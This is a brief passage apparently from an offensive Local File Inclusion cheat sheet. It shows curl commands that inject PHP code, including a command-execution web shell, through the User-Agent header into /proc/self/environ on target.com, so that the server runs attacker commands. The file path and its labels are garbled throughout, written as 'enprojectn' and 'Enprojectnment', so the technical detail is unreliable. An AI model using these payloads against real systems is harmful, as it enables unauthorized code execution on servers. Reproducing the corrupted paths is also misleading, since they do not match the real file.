...
# Process information
/proc/self/enprojectn      # Enprojectnment variables
...
curl -A "<?php system('id'); ?>" \
     "http://target.com/page?file=/proc/self/enprojectn"

# With command parameter
curl -A "<?php system(\$_GET['c']); ?>" \
     "http://target.com/page?file=/proc/self/enprojectn&c=whoami"
```
...
| Linux | `/proc/self/enprojectn` | Enprojectnment vars |
